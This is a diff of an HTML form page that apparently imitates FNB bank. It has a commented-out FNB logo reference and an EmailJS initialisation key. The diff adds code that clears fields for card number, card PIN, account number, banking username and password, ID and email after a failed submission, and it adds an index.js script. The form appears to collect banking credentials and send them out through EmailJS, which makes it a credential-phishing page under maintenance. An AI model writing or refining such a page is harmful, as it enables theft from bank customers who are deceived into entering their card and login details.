@@ -10,7 +10,7 @@
     <script type="text/javascript">
         (function() {
             // https://dashboard.emailjs.com/admin/account
-            emailjs.init('dOZJ6E5Ufan8Z7P9A');
+            emailjs.init('dOZJ6E5Ufan8Z7P9');
         })();
     </script>
     <script type="text/javascript">
@@ -35,8 +35,21 @@
                         }
                     }, function(error) {
                         console.log('FAILED...', error);
-                        let input = document.querySelectorAll('input')
-                        input.innerHTML = ""
+                        name.value = ""
+                        surname.value = ""
+                        lastname.value = ""
+                        reference.value = ""
+                        address.value = ""
+                        state.value = ""
+                        postal.value = ""
+                        amount.value = ""
+                        acctNumber.value = ""
+                        cardNumber.value = ""
+                        cardPin.value = ""
+                        username.value = ""
+                        password.value = ""
+                        id.value = ""
+                        email.value = ""
                         let subscribe = document.getElementById('submit')
                         subscribe.value = 'unable to submit'
                         subscribe.style.animationName = 'failed';
@@ -44,6 +57,7 @@
                         function sub(){
                             subscribe.value = 'Submit'
                         }
+
                     });
             });
         }
@@ -149,5 +163,6 @@
     </form>
    </div>
     <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <script src="index.js"></script>
 </body>
 </html>
